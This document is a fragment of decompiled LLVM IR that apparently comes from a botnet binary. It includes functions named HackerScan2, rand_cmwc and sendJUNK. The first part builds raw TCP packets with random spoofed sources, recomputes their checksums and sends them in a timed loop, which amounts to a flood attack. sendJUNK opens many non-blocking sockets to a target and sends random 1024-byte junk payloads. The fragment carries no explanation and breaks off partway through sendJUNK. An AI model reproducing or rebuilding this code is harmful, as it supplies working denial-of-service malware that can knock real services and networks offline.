  store i32 %v3_10b04, i32* %r3.global-to-local, align 4
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v1_10b0c = trunc i32 %v0_10af8 to i8
  %v3_10b0c = add i32 %v3_10884, 34
  %v4_10b0c = inttoptr i32 %v3_10b0c to i8*
  store i8 %v1_10b0c, i8* %v4_10b0c, align 2
  %v0_10b10 = load i32, i32* %r3.global-to-local, align 4
  %v3_10b1025 = udiv i32 %v0_10b10, 256
  %v1_10b14 = trunc i32 %v3_10b1025 to i8
  %v2_10b14 = load i32, i32* %r2.global-to-local, align 4
  %v3_10b14 = add i32 %v2_10b14, 15
  %v4_10b14 = inttoptr i32 %v3_10b14 to i8*
  store i8 %v1_10b14, i8* %v4_10b14, align 1
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10b20 = add i32 %v3_10884, 36
  %v4_10b20 = inttoptr i32 %v3_10b20 to i8*
  store i8 0, i8* %v4_10b20, align 4
  %v0_10b24 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b24 = trunc i32 %v0_10b24 to i8
  %v2_10b24 = load i32, i32* %r2.global-to-local, align 4
  %v3_10b24 = add i32 %v2_10b24, 17
  %v4_10b24 = inttoptr i32 %v3_10b24 to i8*
  store i8 %v1_10b24, i8* %v4_10b24, align 1
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10b30 = add i32 %v3_10884, 38
  %v4_10b30 = inttoptr i32 %v3_10b30 to i8*
  store i8 0, i8* %v4_10b30, align 2
  %v0_10b34 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b34 = trunc i32 %v0_10b34 to i8
  %v2_10b34 = load i32, i32* %r2.global-to-local, align 4
  %v3_10b34 = add i32 %v2_10b34, 19
  %v4_10b34 = inttoptr i32 %v3_10b34 to i8*
  store i8 %v1_10b34, i8* %v4_10b34, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_10710, label %dec_label_pc_10b44, label %dec_label_pc_10b5c

dec_label_pc_10b44:                               ; preds = %dec_label_pc_10af8
  %v0_10b44 = call i32 @rand_cmwc()
  %v3_10b4c = mul i32 %v0_10b44, 65536
  store i32 %v3_10b4c, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_10b44 to i8
  br label %dec_label_pc_10b78

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_10af8
  %v3_10b64 = urem i32 %arg2, 65536
  store i32 %v3_10b64, i32* %r3.global-to-local, align 4
  %v1_10b6c = call i32 @htons(i32 %v3_10b64)
  %extract.t71 = trunc i32 %v1_10b6c to i8
  br label %dec_label_pc_10b78

dec_label_pc_10b78:                               ; preds = %dec_label_pc_10b44, %dec_label_pc_10b5c
  %v0_10b44.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_10b44 ], [ %extract.t71, %dec_label_pc_10b5c ]
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v4_10b7c = sext i8 %v0_10b44.sink.off0 to i32
  %v3_10b80 = add i32 %v3_10884, 22
  %v4_10b80 = inttoptr i32 %v3_10b80 to i8*
  store i8 %v0_10b44.sink.off0, i8* %v4_10b80, align 2
  %v3_10b88 = sdiv i32 %v4_10b7c, 256
  %v4_10b88 = trunc i32 %v3_10b88 to i8
  store i32 %v3_10b88, i32* %r3.global-to-local, align 4
  %v4_10b8c = add i32 %v3_10884, 23
  %v5_10b8c = inttoptr i32 %v4_10b8c to i8*
  store i8 %v4_10b88, i8* %v5_10b8c, align 1
  %v5_10b98 = call i32 @tcpcsum(i32 %v3_10884, i32 %v1_108a4, i32 %v1_108a4, i32 %v3_10b88)
  %sext = mul i32 %v5_10b98, 16777216
  %v1_10b9c = sdiv i32 %sext, 16777216
  store i32 %v1_10b9c, i32* %r3.global-to-local, align 4
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v1_10ba4 = trunc i32 %v1_10b9c to i8
  store i8 %v1_10ba4, i8* %v4_10b20, align 4
  %v0_10ba8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10ba828 = udiv i32 %v0_10ba8, 256
  %v1_10bac = trunc i32 %v3_10ba828 to i8
  %v2_10bac = load i32, i32* %r2.global-to-local, align 4
  %v3_10bac = add i32 %v2_10bac, 17
  %v4_10bac = inttoptr i32 %v3_10bac to i8*
  store i8 %v1_10bac, i8* %v4_10bac, align 1
  %v1_10bbc = or i32 %v3_10884, 2
  store i32 %v1_10bbc, i32* %r3.global-to-local, align 4
  %v1_10bc0 = inttoptr i32 %v1_10bbc to i8*
  %v2_10bc0 = load i8, i8* %v1_10bc0, align 2
  %v3_10bc0 = zext i8 %v2_10bc0 to i32
  store i32 %v3_10bc0, i32* %r2.global-to-local, align 4
  %v1_10bc4 = or i32 %v1_10880, 3
  %v2_10bc4 = inttoptr i32 %v1_10bc4 to i8*
  %v3_10bc4 = load i8, i8* %v2_10bc4, align 1
  %v4_10bc4 = zext i8 %v3_10bc4 to i32
  %v4_10bc8 = mul nuw nsw i32 %v4_10bc4, 256
  %v5_10bc8 = or i32 %v4_10bc8, %v3_10bc0
  store i32 %v5_10bc8, i32* %r3.global-to-local, align 4
  %v3_10bd4 = call i32 @csum(i8* %v4_108e0, i32 %v5_10bc8)
  %sext4 = mul i32 %v3_10bd4, 16777216
  %v1_10bd8 = sdiv i32 %sext4, 16777216
  store i32 %v1_10bd8, i32* %r3.global-to-local, align 4
  store i32 %v3_10884, i32* %r2.global-to-local, align 4
  %v1_10be0 = trunc i32 %v1_10bd8 to i8
  %v3_10be0 = add i32 %v3_10884, 10
  %v4_10be0 = inttoptr i32 %v3_10be0 to i8*
  store i8 %v1_10be0, i8* %v4_10be0, align 2
  %v0_10be4 = load i32, i32* %r3.global-to-local, align 4
  %v3_10be4 = sdiv i32 %v0_10be4, 256
  store i32 %v3_10be4, i32* %r3.global-to-local, align 4
  %v1_10be8 = trunc i32 %v3_10be4 to i8
  %v2_10be8 = load i32, i32* %r2.global-to-local, align 4
  %v3_10be8 = add i32 %v2_10be8, 11
  %v4_10be8 = inttoptr i32 %v3_10be8 to i8*
  store i8 %v1_10be8, i8* %v4_10be8, align 1
  %v2_10bf0 = call i32 @__GI_time(i32* null)
  %v2_10bfc = add i32 %v2_10bf0, %arg3
  store i32 %v2_10bfc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10c54 = add i32 %v3_10884, 12
  %v3_10c54 = inttoptr i32 %v2_10c54 to i32*
  %v3_10c6c = add i32 %v3_10884, 4
  %v4_10c6c = inttoptr i32 %v3_10c6c to i8*
  %v4_10cb4 = add i32 %v3_10884, 37
  %v5_10cb4 = inttoptr i32 %v4_10cb4 to i8*
  br label %dec_label_pc_10c10

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10d48, %dec_label_pc_10d3c, %dec_label_pc_10b78
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10b78 ], [ 0, %dec_label_pc_10d3c ], [ %v1_10d4c, %dec_label_pc_10d48 ]
  store i32 %v3_10884, i32* %r2.global-to-local, align 4
  %v1_10c18 = load i32, i32* @sp, align 4
  %v2_10c18 = inttoptr i32 %v1_10c18 to i32*
  store i32 %v2_10780, i32* %v2_10c18, align 4
  %v1_10c20 = load i32, i32* @sp, align 4
  %v2_10c20 = add i32 %v1_10c20, 4
  %v3_10c20 = inttoptr i32 %v2_10c20 to i32*
  store i32 16, i32* %v3_10c20, align 4
  %v0_10c28 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_10854, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_10c34 = inttoptr i32 %v0_10c28 to i32*
  %v7_10c34 = call i32 @__libc_sendto(i32 %v0_107a4, i32* %v6_10c34, i32 %v1_10854, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10c3c = call i32 @HackerScan2(i32 %storemerge10)
  store i32 %v1_10c3c, i32* %r3.global-to-local, align 4
  %v1_10c48 = call i32 @htonl(i32 %v1_10c3c)
  store i32 %v1_10c48, i32* %r2.global-to-local, align 4
  store i32 %v3_10884, i32* %r3.global-to-local, align 4
  store i32 %v1_10c48, i32* %v3_10c54, align 4
  %v0_10c58 = call i32 @rand_cmwc()
  %v3_10c64 = urem i32 %v0_10c58, 65536
  store i32 %v3_10c64, i32* %r3.global-to-local, align 4
  store i32 %v3_10884, i32* %r2.global-to-local, align 4
  %v1_10c6c = trunc i32 %v0_10c58 to i8
  store i8 %v1_10c6c, i8* %v4_10c6c, align 4
  %v0_10c70 = load i32, i32* %r3.global-to-local, align 4
  %v3_10c70 = sdiv i32 %v0_10c70, 256
  store i32 %v3_10c70, i32* %r3.global-to-local, align 4
  %v1_10c74 = trunc i32 %v3_10c70 to i8
  %v2_10c74 = load i32, i32* %r2.global-to-local, align 4
  %v3_10c74 = add i32 %v2_10c74, 5
  %v4_10c74 = inttoptr i32 %v3_10c74 to i8*
  store i8 %v1_10c74, i8* %v4_10c74, align 1
  %v0_10c78 = call i32 @rand_cmwc()
  store i32 %v0_10c78, i32* %r2.global-to-local, align 4
  store i32 %v1_108a4, i32* %r3.global-to-local, align 4
  store i32 %v0_10c78, i32* %v3_10910, align 4
  %v0_10c88 = call i32 @rand_cmwc()
  %v3_10c94 = urem i32 %v0_10c88, 65536
  store i32 %v3_10c94, i32* %r3.global-to-local, align 4
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v1_10c9c = trunc i32 %v0_10c88 to i8
  store i8 %v1_10c9c, i8* %v5_108a8, align 4
  %v0_10ca0 = load i32, i32* %r3.global-to-local, align 4
  %v3_10ca029 = udiv i32 %v0_10ca0, 256
  %v1_10ca4 = trunc i32 %v3_10ca029 to i8
  %v2_10ca4 = load i32, i32* %r2.global-to-local, align 4
  %v3_10ca4 = add i32 %v2_10ca4, 1
  %v4_10ca4 = inttoptr i32 %v3_10ca4 to i8*
  store i8 %v1_10ca4, i8* %v4_10ca4, align 1
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_10b20, align 4
  store i8 0, i8* %v5_10cb4, align 1
  %v5_10cc0 = call i32 @tcpcsum(i32 %v3_10884, i32 %v1_108a4, i32 %v1_108a4, i32 0)
  %sext5 = mul i32 %v5_10cc0, 16777216
  %v1_10cc4 = sdiv i32 %sext5, 16777216
  store i32 %v1_10cc4, i32* %r3.global-to-local, align 4
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v1_10ccc = trunc i32 %v1_10cc4 to i8
  store i8 %v1_10ccc, i8* %v4_10b20, align 4
  %v0_10cd0 = load i32, i32* %r3.global-to-local, align 4
  %v3_10cd030 = udiv i32 %v0_10cd0, 256
  %v1_10cd4 = trunc i32 %v3_10cd030 to i8
  %v2_10cd4 = load i32, i32* %r2.global-to-local, align 4
  %v3_10cd4 = add i32 %v2_10cd4, 17
  %v4_10cd4 = inttoptr i32 %v3_10cd4 to i8*
  store i8 %v1_10cd4, i8* %v4_10cd4, align 1
  store i32 %v1_10bbc, i32* %r3.global-to-local, align 4
  %v2_10ce8 = load i8, i8* %v1_10bc0, align 2
  %v3_10ce8 = zext i8 %v2_10ce8 to i32
  store i32 %v3_10ce8, i32* %r2.global-to-local, align 4
  %v3_10cec = load i8, i8* %v2_10bc4, align 1
  %v4_10cec = zext i8 %v3_10cec to i32
  %v4_10cf0 = mul nuw nsw i32 %v4_10cec, 256
  %v5_10cf0 = or i32 %v4_10cf0, %v3_10ce8
  store i32 %v5_10cf0, i32* %r3.global-to-local, align 4
  %v3_10cfc = call i32 @csum(i8* %v4_108e0, i32 %v5_10cf0)
  %sext6 = mul i32 %v3_10cfc, 16777216
  %v1_10d00 = sdiv i32 %sext6, 16777216
  store i32 %v1_10d00, i32* %r3.global-to-local, align 4
  store i32 %v3_10884, i32* %r2.global-to-local, align 4
  %v1_10d08 = trunc i32 %v1_10d00 to i8
  store i8 %v1_10d08, i8* %v4_10be0, align 2
  %v0_10d0c = load i32, i32* %r3.global-to-local, align 4
  %v3_10d0c31 = udiv i32 %v0_10d0c, 256
  %v1_10d10 = trunc i32 %v3_10d0c31 to i8
  %v2_10d10 = load i32, i32* %r2.global-to-local, align 4
  %v3_10d10 = add i32 %v2_10d10, 11
  %v4_10d10 = inttoptr i32 %v3_10d10 to i8*
  store i8 %v1_10d10, i8* %v4_10d10, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_10d1c = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_10d1c, label %dec_label_pc_10d24, label %dec_label_pc_10d48

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10c10
  %v2_10d28 = call i32 @__GI_time(i32* null)
  store i32 %v2_10d28, i32* %r2.global-to-local, align 4
  store i32 %v2_10bfc, i32* %r3.global-to-local, align 4
  %v8_10d38 = icmp sgt i32 %v2_10d28, %v2_10bfc
  br i1 %v8_10d38, label %dec_label_pc_10d58, label %dec_label_pc_10d3c

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10d24
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c10

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10c10
  %v1_10d4c = add i32 %stack_var_-88.0, 1
  store i32 %v1_10d4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10c10

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10d24, %dec_label_pc_1075c, %dec_label_pc_10808, %dec_label_pc_107bc
  %v12_10d60 = phi i32 [ %v3_1076c, %dec_label_pc_1075c ], [ %v3_10818, %dec_label_pc_10808 ], [ %v3_107cc, %dec_label_pc_107bc ], [ %v2_10d28, %dec_label_pc_10d24 ]
  store i32 %v3_106d0, i32* @r4, align 4
  store i32 %v6_106d0, i32* @fp, align 4
  ret i32 %v12_10d60

; uselistorder directives
  uselistorder i32 %v1_10d4c, { 1, 0 }
  uselistorder i32 %v1_10d00, { 1, 0 }
  uselistorder i32 %v1_10cc4, { 1, 0 }
  uselistorder i32 %v0_10c88, { 1, 0 }
  uselistorder i32 %v3_10c70, { 1, 0 }
  uselistorder i32 %v0_10c58, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_10bfc, { 1, 0, 2 }
  uselistorder i32 %v3_10be4, { 1, 0 }
  uselistorder i32 %v1_10bd8, { 1, 0 }
  uselistorder i32 %v1_10bbc, { 0, 2, 1 }
  uselistorder i32 %v1_10b9c, { 1, 0 }
  uselistorder i32 %v3_10b88, { 2, 0, 1 }
  uselistorder i8 %v0_10b44.sink.off0, { 1, 0 }
  uselistorder i32 %v3_10b64, { 1, 0 }
  uselistorder i32 %v0_10b44, { 1, 0 }
  uselistorder i32 %v0_10af8, { 1, 0 }
  uselistorder i32 %v2_10ae0, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_109f0, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_10964, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_108fc, { 1, 0 }
  uselistorder i32 %v0_108e4, { 1, 0 }
  uselistorder i32 %v1_108a4, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_10884, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_10854, { 1, 0 }
  uselistorder i32 %v3_10740, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 7, 8, 5, 6, 12, 13, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 28, 29, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 55, 39, 40, 42, 41, 43, 45, 44, 46, 48, 47, 49, 51, 50, 52, 54, 53, 1, 56, 57, 58, 59, 60, 61, 64, 62, 63, 65, 66, 67, 68, 70, 69, 71, 72, 73, 75, 74, 76, 77, 78, 80, 79, 81, 82, 83, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_10d58, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10b78, { 1, 0 }
  uselistorder label %dec_label_pc_10ad8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_109d0, { 1, 0 }
  uselistorder label %dec_label_pc_10850, { 1, 0 }
  uselistorder label %dec_label_pc_1075c, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10d94 = load i32, i32* @r4, align 4
  store i32 %v3_10d94, i32* %stack_var_-20, align 4
  %v6_10d94 = load i32, i32* @fp, align 4
  store i32 69020, i32* %stack_var_-4, align 4
  %v2_10d98 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10d98, i32* @fp, align 4
  %v0_10db4 = call i32 @getdtablesize()
  %tmp = icmp slt i32 %v0_10db4, 0
  %v3_10dbc = zext i1 %tmp to i32
  %v2_10dc0 = add i32 %v3_10dbc, %v0_10db4
  %v3_10dc4 = sdiv i32 %v2_10dc0, 2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v3_10de4 = urem i32 %arg2, 65536
  %v1_10dec = call i32 @htons(i32 %v3_10de4)
  %v3_10e10 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_10e18 = icmp eq i32 %v3_10e10, 0
  br i1 %v2_10e18, label %dec_label_pc_10e24, label %dec_label_pc_1129c

dec_label_pc_10e24:                               ; preds = %entry
  %v16_10d94 = ptrtoint i32* %stack_var_-20 to i32
  %v3_10e40 = mul i32 %v3_10dc4, 8
  %v1_10e44 = or i32 %v3_10e40, 3
  %v1_10e48 = add i32 %v1_10e44, 3
  %v3_10e4c = and i32 %v1_10e48, -4
  %v1_10e54 = load i32, i32* @sp, align 4
  %v2_10e54 = sub i32 %v1_10e54, %v3_10e4c
  %v1_10e64 = add i32 %v2_10e54, 7
  %v3_10e68 = and i32 %v1_10e64, -4
  %v2_10e8c = mul i32 %v3_10dc4, 5
  store i32 %v2_10e8c, i32* @r2, align 4
  %v2_10ea0 = inttoptr i32 %v3_10e68 to i8*
  %v3_10ea0 = call i32 @__GI_memset(i8* %v2_10ea0, i32 0)
  %v1_10ea8 = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_10ec4 = inttoptr i32 %v1_10ea8 to i8*
  %v3_10ec4 = call i32 @__GI_memset(i8* %v2_10ec4, i32 0)
  %v2_10ecc = call i32 @__GI_time(i32* null)
  store i32 %v2_10ecc, i32* %r2.global-to-local, align 4
  %v2_10ed8 = add i32 %v2_10ecc, %arg3
  %v2_11014 = ptrtoint i32* %stack_var_-196 to i32
  %v2_110d8 = ptrtoint i32* %stack_var_-204 to i32
  %v2_11120 = ptrtoint i32* %stack_var_-208 to i32
  %v4_11210 = inttoptr i32 %v1_10ea8 to i32*
  %v3_10fb4 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v8_1127c48 = icmp sgt i32 %v2_10dc0, 1
  %v2_10f00 = add i32 %v3_10e68, 4
  %v2_11070 = add i32 %v16_10d94, -176
  br label %dec_label_pc_11284

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_11274.preheader, %dec_label_pc_11268
  %storemerge251 = phi i32 [ %v1_1126c, %dec_label_pc_11268 ], [ 0, %dec_label_pc_11274.preheader ]
  store i32 %v3_10e68, i32* %r2.global-to-local, align 4
  %v3_10efc = mul i32 %storemerge251, 8
  %v2_10f04 = add i32 %v2_10f00, %v3_10efc
  %v1_10f08 = inttoptr i32 %v2_10f04 to i8*
  %v2_10f08 = load i8, i8* %v1_10f08, align 4
  %v6_10f14 = icmp eq i8 %v2_10f08, 0
  %v7_10f14 = icmp eq i8 %v2_10f08, 1
  br i1 %v7_10f14, label %dec_label_pc_11028.lr.ph, label %dec_label_pc_10f1c

dec_label_pc_10f1c:                               ; preds = %dec_label_pc_10ef0
  %v7_10f20 = icmp eq i8 %v2_10f08, 2
  br i1 %v7_10f20, label %dec_label_pc_111e8, label %dec_label_pc_10f28

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10f1c
  br i1 %v6_10f14, label %dec_label_pc_10f38, label %dec_label_pc_11268

dec_label_pc_10f38:                               ; preds = %dec_label_pc_10f28
  store i32 %storemerge251, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_10f48 = call i32 @socket()
  %v2_10f54 = load i32, i32* @r4, align 4
  %v5_10f54 = mul i32 %v2_10f54, 8
  %v6_10f54 = add i32 %v5_10f54, %v3_10e68
  %v7_10f54 = inttoptr i32 %v6_10f54 to i32*
  store i32 %v0_10f48, i32* %v7_10f54, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_10f60 = add i32 %v3_10efc, %v3_10e68
  %v6_10f60 = inttoptr i32 %v5_10f60 to i32*
  %v7_10f60 = load i32, i32* %v6_10f60, align 4
  store i32 %v7_10f60, i32* @r4, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_10f6c = load i32, i32* %v6_10f60, align 4
  store i32 0, i32* @r2, align 4
  %v2_10f7c = call i32 @__libc_fcntl(i32 %v7_10f6c, i32 3)
  %v1_10f84 = or i32 %v2_10f7c, 2048
  %v0_10f88 = load i32, i32* @r4, align 4
  store i32 %v1_10f84, i32* @r2, align 4
  %v2_10f94 = call i32 @__libc_fcntl(i32 %v0_10f88, i32 4)
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_10fa0 = load i32, i32* %v6_10f60, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_10fb4 = call i32 @__libc_connect(i32 %v7_10fa0, %sockaddr* %v3_10fb4, i32 16)
  %v3_10fbc = icmp eq i32 %v4_10fb4, -1
  br i1 %v3_10fbc, label %dec_label_pc_10fc4, label %dec_label_pc_10fd8

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10f38
  %v0_10fc4 = call i32 @__errno_location()
  %v1_10fcc = inttoptr i32 %v0_10fc4 to i32*
  %v2_10fcc = load i32, i32* %v1_10fcc, align 4
  %v7_10fd0 = icmp eq i32 %v2_10fcc, 115
  br i1 %v7_10fd0, label %dec_label_pc_10ff0, label %dec_label_pc_10fd8

dec_label_pc_10fd8:                               ; preds = %dec_label_pc_10f38, %dec_label_pc_10fc4
  store i32 %v3_10e68, i32* %r2.global-to-local, align 4
  %v7_10fe0 = load i32, i32* %v6_10f60, align 4
  %v1_10fe8 = call i32 @__libc_close(i32 %v7_10fe0)
  br label %dec_label_pc_11268

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10fc4
  store i32 %v2_10f04, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_10f08, align 4
  br label %dec_label_pc_11268

dec_label_pc_11028.lr.ph:                         ; preds = %dec_label_pc_10ef0
  br label %dec_label_pc_11028

dec_label_pc_11028:                               ; preds = %dec_label_pc_11028.lr.ph, %dec_label_pc_11028
  %storemerge37 = phi i32 [ 0, %dec_label_pc_11028.lr.ph ], [ %v1_1103c, %dec_label_pc_11028 ]
  store i32 %v2_11014, i32* %r2.global-to-local, align 4
  %v5_11034 = mul nuw nsw i32 %storemerge37, 4
  %v6_11034 = add i32 %v5_11034, %v2_11014
  %v7_11034 = inttoptr i32 %v6_11034 to i32*
  store i32 0, i32* %v7_11034, align 4
  %v1_1103c = add nuw nsw i32 %storemerge37, 1
  %tmp42 = icmp ult i32 %v1_1103c, 32
  br i1 %tmp42, label %dec_label_pc_11028, label %dec_label_pc_11050

dec_label_pc_11050:                               ; preds = %dec_label_pc_11028
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_11058 = add i32 %v3_10efc, %v3_10e68
  %v6_11058 = inttoptr i32 %v5_11058 to i32*
  %v7_11058 = load i32, i32* %v6_11058, align 4
  %v3_1105c = udiv i32 %v7_11058, 32
  store i32 -176, i32* %r2.global-to-local, align 4
  %v3_11068 = mul nuw nsw i32 %v3_1105c, 4
  %v2_11074 = add i32 %v2_11070, %v3_11068
  %v1_11078 = inttoptr i32 %v2_11074 to i32*
  %v2_11078 = load i32, i32* %v1_11078, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_11084 = load i32, i32* %v6_11058, align 4
  %v1_11088 = urem i32 %v7_11084, 32
  %v6_11090 = shl i32 1, %v1_11088
  %v2_11094 = or i32 %v6_11090, %v2_11078
  store i32 %v2_11094, i32* %v1_11078, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_110cc = load i32, i32* %v6_11058, align 4
  %v1_110d0 = add i32 %v7_110cc, 1
  store i32 %v1_110d0, i32* %r2.global-to-local, align 4
  %v1_110dc = load i32, i32* @sp, align 4
  %v2_110dc = inttoptr i32 %v1_110dc to i32*
  store i32 %v2_110d8, i32* %v2_110dc, align 4
  %v0_110e0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_11014, i32* %r2.global-to-local, align 4
  %v4_110f0 = load i32, i32* %stack_var_-204, align 4
  %v5_110f0 = call i32 @__libc_select(i32 %v0_110e0, i32 0, i32 %v2_11014, i32 0, i32 %v4_110f0)
  %v7_11100 = icmp eq i32 %v5_110f0, 1
  br i1 %v7_11100, label %dec_label_pc_11108, label %dec_label_pc_111a4

dec_label_pc_11108:                               ; preds = %dec_label_pc_11050
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_11118 = load i32, i32* %v6_11058, align 4
  store i32 %v7_11118, i32* %r2.global-to-local, align 4
  %v1_11124 = load i32, i32* @sp, align 4
  %v2_11124 = inttoptr i32 %v1_11124 to i32*
  store i32 %v2_11120, i32* %v2_11124, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_11138 = call i32 @getsockopt()
  %v3_1113c = load i32, i32* %stack_var_-212, align 4
  %v2_11140 = icmp eq i32 %v3_1113c, 0
  br i1 %v2_11140, label %dec_label_pc_11180, label %dec_label_pc_11148

dec_label_pc_11148:                               ; preds = %dec_label_pc_11108
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_11150 = load i32, i32* %v6_11058, align 4
  %v1_11158 = call i32 @__libc_close(i32 %v7_11150)
  store i32 %v2_10f04, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f08, align 4
  br label %dec_label_pc_11268

dec_label_pc_11180:                               ; preds = %dec_label_pc_11108
  store i32 %v2_10f04, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_10f08, align 4
  br label %dec_label_pc_11268

dec_label_pc_111a4:                               ; preds = %dec_label_pc_11050
  %v3_111a8 = icmp eq i32 %v5_110f0, -1
  br i1 %v3_111a8, label %dec_label_pc_111b0, label %dec_label_pc_11268

dec_label_pc_111b0:                               ; preds = %dec_label_pc_111a4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_111b8 = load i32, i32* %v6_11058, align 4
  %v1_111c0 = call i32 @__libc_close(i32 %v7_111b8)
  store i32 %v2_10f04, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f08, align 4
  br label %dec_label_pc_11268

dec_label_pc_111e8:                               ; preds = %dec_label_pc_10f1c
  %v2_111f0 = call i32 @makeRandomStr(i32 %v1_10ea8, i32 1024)
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_111fc = add i32 %v3_10efc, %v3_10e68
  %v6_111fc = inttoptr i32 %v5_111fc to i32*
  %v7_111fc = load i32, i32* %v6_111fc, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v5_11210 = call i32 @__libc_send(i32 %v7_111fc, i32* %v4_11210, i32 1024, i32 16384)
